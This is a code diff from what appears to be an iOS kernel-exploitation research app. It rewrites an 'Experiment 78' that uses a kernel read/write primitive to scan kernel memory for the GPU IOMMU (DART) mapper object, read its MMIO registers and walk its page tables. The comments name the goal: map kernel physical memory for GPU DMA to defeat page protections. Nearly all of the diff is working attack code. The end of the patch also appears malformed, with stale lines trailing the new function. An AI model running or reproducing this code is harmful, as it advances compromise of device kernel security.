@@ -4562,30 +4562,384 @@ struct AMFIExperimentView: View {
         return ExperimentResult(name: "Kernel Task Port (Exp 76)", success: success, detail: detail, timestamp: Date())
     }
     
-    // MARK: - Experiment 78: DART PTE Probe — GPU IOMMU Page Table Discovery
+    // MARK: - Experiment 78: DART PTE Probe — Pure KRW, No IOKit
     
-    /// Experiment 78: Find AGX DART page tables in kernel memory
-    /// 
-    /// Strategy:
-    /// 1. Find AGX DART MMIO base via IOKit registry traversal (IOService objects)
-    /// 2. Read TTBR registers to find L1 page table physical addresses
-    /// 3. Convert PA → physmap VA → read DART PTEs
-    /// 4. Catalog existing GPU IOVA→PA mappings
-    /// 5. Determine DAPF constraints (what PA ranges are allowed)
-    /// 6. Test: write a new DART PTE mapping a known-safe PA
-    /// 7. Verify via DART ERROR register if DAPF blocks it
+    /// Experiment 78 v7: Find AGX DART page tables via pure kernel KRW
     ///
-    /// SAFE: DART page tables are in normal DRAM (not PPL-protected)
-    /// Writing DART PTEs via ds_kwrite64 will NOT panic
-    /// Worst case: DART fault (logged in ERROR register), no kernel panic
+    /// CRITICAL LESSON: All IOKit calls (IOServiceMatching, IORegistryEntryCreateCFProperties,
+    /// IOServiceOpen) trigger launchd callbacks → launchd crashes → initproc panic.
+    /// Solution: ZERO IOKit calls. Use only ds_kread64/ds_kwrite64.
+    ///
+    /// Strategy (pure KRW):
+    /// 1. Find IODARTMapper kernel object by scanning zone memory for vtable pattern
+    ///    - IODARTMapper vtable is in IODARTFamily kext __TEXT (known range)
+    ///    - Scan GEN0-GEN3 zone for objects whose first 8 bytes point to kext range
+    /// 2. Read DART MMIO VA from IODARTMapper ivar (offset ~0x60-0x80)
+    ///    - MMIO VA is in kernel IO mapping range (0xfffffff0... or similar)
+    /// 3. Read TTBR[0][0] from MMIO+0x200 via ds_kread32
+    /// 4. Convert TTBR PPN → PA → physmap VA → walk L1/L2 tables
+    /// 5. Catalog IOVA→PA mappings, check DAPF constraints
+    ///
+    /// SAFE: No IOKit, no SpringBoard RC, no launchd involvement
     private func expDARTPTEProbe(rc: RemoteCall) -> ExperimentResult {
-        var detail = "Experiment 78: DART PTE Probe (GPU IOMMU)\n"
-        detail += "==========================================\n\n"
+        var detail = "Experiment 78 v7: DART PTE Probe (Pure KRW)\n"
+        detail += "============================================\n\n"
+        detail += "⚠️ NO IOKit calls — pure ds_kread64 only\n\n"
         
         let kernBase = ds_get_kernel_base()
         let kernSlide = ds_get_kernel_slide()
         let gPhysBase: UInt64 = 0x800000000
-        let gVirtBase: UInt64 = 0xffffffde9a094000
+        let gVirtBase: UInt64 = 0xffffffde9a094000  // zone_map_base (confirmed exp 74)
+        
+        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
+        detail += "Kernel slide: 0x\(String(format: "%llx", kernSlide))\n"
+        detail += "gVirtBase: 0x\(String(format: "%llx", gVirtBase))\n"
+        detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n\n"
+        
+        // Safety bounds — only read addresses in these ranges
+        let safeZoneMin: UInt64 = 0xffffffdc00000000
+        let safeZoneMax: UInt64 = 0xffffffe400000000
+        // Kernel kext range (IODARTFamily vtable lives here)
+        let kextMin: UInt64 = kernBase
+        let kextMax: UInt64 = kernBase + 0x10000000  // 256MB covers all kexts
+        // Kernel IO mapping range (DART MMIO mapped here)
+        let ioMin: UInt64 = 0xfffffff020000000 &+ kernSlide
+        let ioMax: UInt64 = 0xfffffff060000000 &+ kernSlide
+        
+        var confirmedDARTL1: UInt64 = 0
+        var confirmedL2Entries: [(iova: UInt64, pa: UInt64)] = []
+        var dartMmioVA: UInt64 = 0
+        var dartObjectAddr: UInt64 = 0
+        
+        // ============================================================
+        // STEP 1: Find IODARTMapper kernel object via vtable scan
+        //
+        // IOKit objects in kernel zone memory have this layout:
+        //   +0x00: vtable pointer → points into kext __TEXT (0xfffffff0...)
+        //   +0x08: retain count (small integer)
+        //   +0x10: IOService state flags
+        //   ...
+        //   +0x60-0x90: MMIO base VA (points into IO mapping range)
+        //
+        // IODARTMapper vtable is in IODARTFamily kext.
+        // We scan GEN0-GEN3 zone for objects whose vtable points to kext range.
+        // Then verify by checking if any ivar looks like an IO mapping VA.
+        // ============================================================
+        detail += "=== Step 1: Scan zone for IODARTMapper object ===\n"
+        detail += "Looking for vtable in kext range: 0x\(String(format: "%llx", kextMin))-0x\(String(format: "%llx", kextMax))\n"
+        detail += "Looking for MMIO ivar in IO range: 0x\(String(format: "%llx", ioMin))-0x\(String(format: "%llx", ioMax))\n\n"
+        
+        let ourProc = ds_get_our_proc()
+        
+        // Scan ±4MB around our proc (stays in same zone generation)
+        let scanCenter = ourProc & ~UInt64(0xFFF)
+        let scanStart = scanCenter &- 0x400000
+        let scanEnd   = scanCenter &+ 0x400000
+        
+        detail += "Scan range: 0x\(String(format: "%llx", scanStart)) - 0x\(String(format: "%llx", scanEnd))\n"
+        
+        // Scan in 16-byte steps (IOKit objects are 16-byte aligned)
+        var candidatesFound = 0
+        
+        for addr in stride(from: scanStart, to: scanEnd, by: 16) {
+            guard addr >= safeZoneMin && addr < safeZoneMax else { continue }
+            
+            // Read potential vtable pointer
+            let vtable = ds_kread64_safe(addr)
+            
+            // vtable must point into kext range
+            guard vtable >= kextMin && vtable < kextMax else { continue }
+            
+            // Verify: vtable+0 should be a valid function pointer (also in kext range)
+            let firstMethod = ds_kread64_safe(vtable)
+            guard firstMethod >= kextMin && firstMethod < kextMax else { continue }
+            
+            // Now scan ivars at +0x40 to +0xC0 for MMIO VA
+            var foundMmio: UInt64 = 0
+            for ivarOff: UInt64 in stride(from: 0x40, to: 0xC0, by: 8) {
+                let ivarAddr = addr + ivarOff
+                guard ivarAddr >= safeZoneMin && ivarAddr < safeZoneMax else { continue }
+                let ivar = ds_kread64_safe(ivarAddr)
+                if ivar >= ioMin && ivar < ioMax {
+                    foundMmio = ivar
+                    break
+                }
+            }
+            
+            if foundMmio != 0 {
+                candidatesFound += 1
+                detail += "✅ Candidate at 0x\(String(format: "%llx", addr)):\n"
+                detail += "   vtable=0x\(String(format: "%llx", vtable))\n"
+                detail += "   MMIO VA=0x\(String(format: "%llx", foundMmio))\n"
+                dartObjectAddr = addr
+                dartMmioVA = foundMmio
+                if candidatesFound >= 3 { break }  // take first good one
+            }
+        }
+        
+        detail += "\nCandidates found: \(candidatesFound)\n\n"
+        
+        // ============================================================
+        // STEP 2: Read DART MMIO registers via KRW
+        //
+        // DART MMIO register layout (T8020/A12):
+        //   +0x000: PARAMS1 — bits[27:24] = page_shift (12 for 4KB)
+        //   +0x020: STREAM_COMMAND
+        //   +0x034: STREAM_SELECT
+        //   +0x040: ERROR status
+        //   +0x060: CONFIG (bit[15] = LOCK)
+        //   +0x0fc: STREAMS_ENABLE
+        //   +0x100 + sid*4: TCR[sid] — bit[7]=TRANSLATE_ENABLE
+        //   +0x200 + sid*16 + idx*4: TTBR[sid][idx] — bit[31]=VALID, bits[30:0]=PPN
+        // ============================================================
+        detail += "=== Step 2: Read DART MMIO registers ===\n"
+        
+        if dartMmioVA == 0 {
+            // Fallback: try known A12 DART MMIO kernel VA
+            // DART MMIO is mapped at a fixed offset from kernel base on A12
+            // IODARTFamily maps it via ml_io_map during boot
+            // Typical kernel IO mapping base: kernBase + ~0x1C000000
+            // But this varies. Try scanning kernel __DATA for IO pointers.
+            detail += "No DART object found via zone scan\n"
+            detail += "Trying fallback: scan kernel __DATA for MMIO pointer\n\n"
+            
+            // Scan __DATA (safe region, below PPL at +0x8000)
+            let dataBase = kernBase + 0x30dc000
+            for off: UInt64 in stride(from: 0, to: 0x7000, by: 8) {
+                let val = ds_kread64_safe(dataBase + off)
+                if val >= ioMin && val < ioMax {
+                    // Verify it looks like DART MMIO: PARAMS1 should have page_shift=12
+                    let params1 = ds_kread32_safe(val)
+                    let pageShift = (params1 >> 24) & 0xF
+                    if pageShift == 12 || pageShift == 14 {
+                        detail += "✅ DART MMIO via __DATA+0x\(String(format: "%x", off)): 0x\(String(format: "%llx", val))\n"
+                        detail += "   PARAMS1=0x\(String(format: "%08x", params1)) page_shift=\(pageShift)\n"
+                        dartMmioVA = val
+                        break
+                    }
+                }
+            }
+        }
+        
+        if dartMmioVA != 0 {
+            detail += "DART MMIO VA: 0x\(String(format: "%llx", dartMmioVA))\n\n"
+            
+            // Read PARAMS1
+            let params1 = ds_kread32_safe(dartMmioVA + 0x000)
+            let pageShift = (params1 >> 24) & 0xF
+            detail += "PARAMS1: 0x\(String(format: "%08x", params1)) (page_shift=\(pageShift))\n"
+            
+            // Read CONFIG
+            let config = ds_kread32_safe(dartMmioVA + 0x060)
+            let locked = (config >> 15) & 1
+            detail += "CONFIG: 0x\(String(format: "%08x", config)) (locked=\(locked))\n"
+            
+            // Read STREAMS_ENABLE
+            let streamsEn = ds_kread32_safe(dartMmioVA + 0x0fc)
+            detail += "STREAMS_ENABLE: 0x\(String(format: "%08x", streamsEn))\n\n"
+            
+            // Read all TTBRs (4 SIDs × 4 TTBRs each)
+            detail += "TTBR registers:\n"
+            var validTTBRs: [(sid: Int, idx: Int, ppn: UInt64)] = []
+            
+            for sid in 0..<4 {
+                for idx in 0..<4 {
+                    let ttbrOff = UInt64(0x200 + sid * 16 + idx * 4)
+                    let ttbrVal = ds_kread32_safe(dartMmioVA + ttbrOff)
+                    if ttbrVal != 0 {
+                        let valid = (ttbrVal >> 31) & 1
+                        let ppn = UInt64(ttbrVal & 0x7FFFFFFF)
+                        detail += "  TTBR[\(sid)][\(idx)] = 0x\(String(format: "%08x", ttbrVal))"
+                        detail += " valid=\(valid) PPN=0x\(String(format: "%x", ppn))\n"
+                        if valid == 1 && ppn >= 0x800000 && ppn < 0x900000 {
+                            validTTBRs.append((sid: sid, idx: idx, ppn: ppn))
+                        }
+                    }
+                }
+            }
+            
+            detail += "\nValid TTBRs: \(validTTBRs.count)\n\n"
+            
+            // ============================================================
+            // STEP 3: Walk L1→L2 tables from TTBR
+            // TTBR PPN → L1 PA → physmap VA → read L1 entries
+            // L1 entry → L2 PA → physmap VA → read L2 entries (leaf PTEs)
+            // ============================================================
+            if let firstTTBR = validTTBRs.first {
+                detail += "=== Step 3: Walk L1→L2 from TTBR[\(firstTTBR.sid)][\(firstTTBR.idx)] ===\n"
+                
+                let l1PA = firstTTBR.ppn << 12
+                let l1VA = l1PA &- gPhysBase &+ gVirtBase
+                
+                detail += "L1 PA: 0x\(String(format: "%llx", l1PA))\n"
+                detail += "L1 VA (physmap): 0x\(String(format: "%llx", l1VA))\n\n"
+                
+                guard l1VA >= safeZoneMin && l1VA < safeZoneMax else {
+                    detail += "⚠️ L1 VA outside safe zone — cannot walk\n"
+                    detail += "L1 is in physmap region (0xffffffde...) — need extended bounds\n"
+                    
+                    // Try with extended bounds that include physmap region
+                    let extMin: UInt64 = 0xffffffd000000000
+                    let extMax: UInt64 = 0xffffffe500000000
+                    
+                    if l1VA >= extMin && l1VA < extMax {
+                        detail += "L1 VA is in extended physmap range — attempting read\n"
+                        let testRead = ds_kread64_safe(l1VA)
+                        detail += "L1[0] test read: 0x\(String(format: "%llx", testRead))\n"
+                        
+                        if testRead != 0 && testRead & 1 == 1 {
+                            confirmedDARTL1 = l1VA
+                            detail += "✅ L1 readable! Walking entries...\n\n"
+                            
+                            for i in 0..<512 {
+                                let entryAddr = l1VA + UInt64(i * 8)
+                                let entry = ds_kread64_safe(entryAddr)
+                                if entry == 0 { continue }
+                                if entry & 1 == 1 {
+                                    let l2PA = entry & 0x0000000FFFFFF000
+                                    let l2VA = l2PA &- gPhysBase &+ gVirtBase
+                                    if i < 8 {
+                                        detail += "  L1[\(i)]: 0x\(String(format: "%016llx", entry)) → L2 PA=0x\(String(format: "%llx", l2PA))\n"
+                                    }
+                                    // Walk L2
+                                    if l2VA >= extMin && l2VA < extMax {
+                                        var l2Count = 0
+                                        for j in 0..<512 {
+                                            let l2e = ds_kread64_safe(l2VA + UInt64(j * 8))
+                                            if l2e & 1 == 1 {
+                                                let leafPA = l2e & 0x0000000FFFFFF000
+                                                let iova = UInt64(i) << 21 | UInt64(j) << 12
+                                                confirmedL2Entries.append((iova: iova, pa: leafPA))
+                                                l2Count += 1
+                                            }
+                                        }
+                                        if i < 4 { detail += "    L2 entries: \(l2Count)\n" }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    
+                    if confirmedDARTL1 == 0 {
+                        detail += "\nL1 not readable — DART tables in wired memory outside zone\n"
+                        detail += "DART MMIO found ✅ — this is major progress!\n"
+                        detail += "TTBR values read ✅ — we know L1 physical address\n"
+                        detail += "Next: use physmap walk (exp 74 method) to read L1\n"
+                    }
+                    
+                    // Still report MMIO success even if L1 walk failed
+                    let success = dartMmioVA != 0
+                    return ExperimentResult(name: "DART PTE Probe (Exp 78)", success: success, detail: detail, timestamp: Date())
+                }
+                
+                // L1 VA is in safe zone — walk normally
+                confirmedDARTL1 = l1VA
+                var l1ValidEntries: [(idx: Int, entry: UInt64)] = []
+                
+                for i in 0..<512 {
+                    let entryAddr = l1VA + UInt64(i * 8)
+                    guard entryAddr >= safeZoneMin && entryAddr < safeZoneMax else { continue }
+                    let entry = ds_kread64_safe(entryAddr)
+                    if entry == 0 { continue }
+                    if entry & 1 == 1 {
+                        l1ValidEntries.append((idx: i, entry: entry))
+                        if l1ValidEntries.count <= 8 {
+                            let l2PA = entry & 0x0000000FFFFFF000
+                            detail += "  L1[\(i)]: 0x\(String(format: "%016llx", entry)) → L2 PA=0x\(String(format: "%llx", l2PA))\n"
+                        }
+                    }
+                }
+                
+                detail += "Valid L1 entries: \(l1ValidEntries.count)\n\n"
+                
+                // Walk L2 tables
+                detail += "=== Step 4: Walk L2 tables ===\n"
+                for (idx, entry) in l1ValidEntries.prefix(4) {
+                    let l2PA = entry & 0x0000000FFFFFF000
+                    let l2VA = l2PA &- gPhysBase &+ gVirtBase
+                    
+                    let extMin: UInt64 = 0xffffffd000000000
+                    let extMax: UInt64 = 0xffffffe500000000
+                    guard l2VA >= extMin && l2VA < extMax else {
+                        detail += "L1[\(idx)] → L2 VA 0x\(String(format: "%llx", l2VA)) out of range\n"
+                        continue
+                    }
+                    
+                    var l2Count = 0
+                    for j in 0..<512 {
+                        let l2Addr = l2VA + UInt64(j * 8)
+                        let l2e = ds_kread64_safe(l2Addr)
+                        if l2e & 1 == 1 {
+                            l2Count += 1
+                            let leafPA = l2e & 0x0000000FFFFFF000
+                            let iova = UInt64(idx) << 21 | UInt64(j) << 12
+                            confirmedL2Entries.append((iova: iova, pa: leafPA))
+                            if l2Count <= 3 {
+                                detail += "  L2[\(j)]: PA=0x\(String(format: "%llx", leafPA)) IOVA=0x\(String(format: "%08x", iova))\n"
+                            }
+                        }
+                    }
+                    detail += "  L1[\(idx)] → \(l2Count) valid L2 entries\n"
+                }
+            }
+        } else {
+            detail += "❌ DART MMIO VA not found\n"
+            detail += "IODARTMapper object not in scanned zone range\n"
+            detail += "DART object may be in wired memory (outside zone allocator)\n\n"
+            detail += "Alternative: read DART MMIO VA from kernel __DATA globals\n"
+            detail += "IODARTFamily stores DART instance pointer in __DATA\n"
+        }
+        
+        detail += "\nTotal IOVA→PA mappings: \(confirmedL2Entries.count)\n\n"
+        
+        // ============================================================
+        // STEP 5: Analysis — DAPF constraints and next steps
+        // ============================================================
+        detail += "=== Step 5: Analysis ===\n"
+        
+        if dartMmioVA != 0 {
+            detail += "✅ DART MMIO found at: 0x\(String(format: "%llx", dartMmioVA))\n"
+        }
+        if confirmedDARTL1 != 0 {
+            detail += "✅ DART L1 table at: 0x\(String(format: "%llx", confirmedDARTL1))\n"
+        }
+        detail += "IOVA→PA mappings: \(confirmedL2Entries.count)\n\n"
+        
+        if !confirmedL2Entries.isEmpty {
+            let pas = confirmedL2Entries.map { $0.pa }
+            let minPA = pas.min() ?? 0
+            let maxPA = pas.max() ?? 0
+            
+            detail += "PA range: 0x\(String(format: "%llx", minPA)) - 0x\(String(format: "%llx", maxPA))\n"
+            detail += "Range size: \((maxPA - minPA) / 1024 / 1024) MB\n\n"
+            
+            let kernDataPA = (kernBase + 0x30dc000) &- gVirtBase &+ gPhysBase
+            let pplDataPA = kernDataPA + 0x8000
+            detail += "Kernel __DATA PA: 0x\(String(format: "%llx", kernDataPA))\n"
+            detail += "PPL data PA: 0x\(String(format: "%llx", pplDataPA))\n"
+            
+            let kernInRange = kernDataPA >= minPA && kernDataPA <= maxPA
+            detail += "Kernel PA in DART range: \(kernInRange)\n\n"
+            
+            if kernInRange {
+                detail += "⚡⚡⚡ KERNEL PA IN DART RANGE — GPU DMA VIABLE! ⚡⚡⚡\n"
+            }
+            
+            let maxIOVA = confirmedL2Entries.map { $0.iova }.max() ?? 0
+            detail += "Free IOVA: 0x\(String(format: "%x", maxIOVA + 0x1000)) - 0xFFFFFFFF\n"
+            detail += "\n🎯 NEXT: Write DART PTE at free IOVA → map target PA → GPU DMA\n"
+        } else if dartMmioVA != 0 {
+            detail += "DART MMIO readable but L1 tables not in zone range\n"
+            detail += "Next: use physmap VA (gVirtBase formula) to read L1 directly\n"
+            detail += "L1 PA known from TTBR — compute physmap VA and read\n"
+        } else {
+            detail += "DART object not found in ±4MB zone scan\n"
+            detail += "Next: expand scan range or scan wired memory region\n"
+        }
+        
+        let success = dartMmioVA != 0 || confirmedDARTL1 != 0 || !confirmedL2Entries.isEmpty
+        return ExperimentResult(name: "DART PTE Probe (Exp 78)", success: success, detail: detail, timestamp: Date())
+    }
         
         detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
         detail += "gVirtBase: 0x\(String(format: "%llx", gVirtBase))\n"
